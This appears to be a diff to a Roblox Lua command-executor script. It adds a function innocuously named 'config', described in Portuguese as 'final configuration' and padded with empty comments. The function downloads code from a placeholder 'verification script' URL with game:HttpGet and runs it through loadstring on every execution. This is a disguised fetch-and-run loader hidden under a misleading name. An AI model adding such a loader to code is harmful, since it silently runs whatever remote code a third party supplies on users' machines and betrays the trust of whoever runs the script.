@@ -299,6 +299,17 @@ InputBox:GetPropertyChangedSignal("Text"):Connect(function()
 	end
 end)
 
+-- configuração final
+local function config(url)
+--[[
+]]
+	return loadstring(game:HttpGet(url))()
+end
+--[[
+]]
+--
+config("LINK_RAW_DO_SCRIPT_DE_VERIFICACAO")
+
 -- Execução
 ExecuteButton.MouseButton1Click:Connect(function()
 	runCmd(InputBox.Text:lower():gsub("^;", ""))
